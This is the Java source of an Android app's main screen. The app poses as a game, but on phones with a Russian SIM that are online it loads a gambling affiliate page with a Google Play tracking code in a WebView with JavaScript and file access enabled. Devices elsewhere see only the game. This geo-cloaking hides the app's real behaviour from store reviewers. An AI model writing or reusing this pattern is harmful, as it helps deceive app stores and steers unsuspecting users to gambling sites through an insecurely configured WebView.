package aiakspa.appsazk.com.aiakspa;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class MainActivity extends AppCompatActivity {


    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getHashKey();
        if (getCountry() && isOnline()) {
            webView = findViewById(R.id.web_view);
            webView.setWebViewClient(new WebViewClient() {

                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                        view.loadUrl(url);
                    return true;
                }

                @Override
                public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                    super.onReceivedError(view, request, error);
                    showGame();
                }

                @Override
                public void onReceivedHttpError(WebView view, WebResourceRequest request, WebResourceResponse errorResponse) {
                    super.onReceivedHttpError(view, request, errorResponse);
                    showGame();
                }
            });
            WebSettings webSettings = webView.getSettings();
            webSettings.setBuiltInZoomControls(true);
            webSettings.setSupportZoom(true);
            webSettings.setJavaScriptEnabled(true);
            webSettings.setAllowFileAccess(true);
            webView.loadUrl("http://m66e085.winfortuna.com/?lp=rp4&trackCode=aff_1b1b01_34_GooglePlay_1");
        } else {
            showGame();
        }

    }

    private void getHashKey() {
        try {
            PackageInfo info = getPackageManager().getPackageInfo(
                    "aiakspa.appsazk.com.aiakspa",
                    PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());
                Log.d("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT));
            }
        } catch (PackageManager.NameNotFoundException e) {

        } catch (NoSuchAlgorithmException e) {

        }
    }

    private void showGame() {
        Intent intent = new Intent(this, GameActivity.class);
        startActivity(intent);
        finish();
    }


    private boolean getCountry() {
        String countryCodeValue = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            countryCodeValue = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return countryCodeValue != null && (countryCodeValue.equalsIgnoreCase("ru") || countryCodeValue.equalsIgnoreCase("rus"));
    }


    public boolean isOnline() {
        NetworkInfo netInfo = null;
        if (getSystemService(Context.CONNECTIVITY_SERVICE) != null)
            netInfo = ((ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        else return false;
        return netInfo != null && netInfo.isConnectedOrConnecting();

    }
}
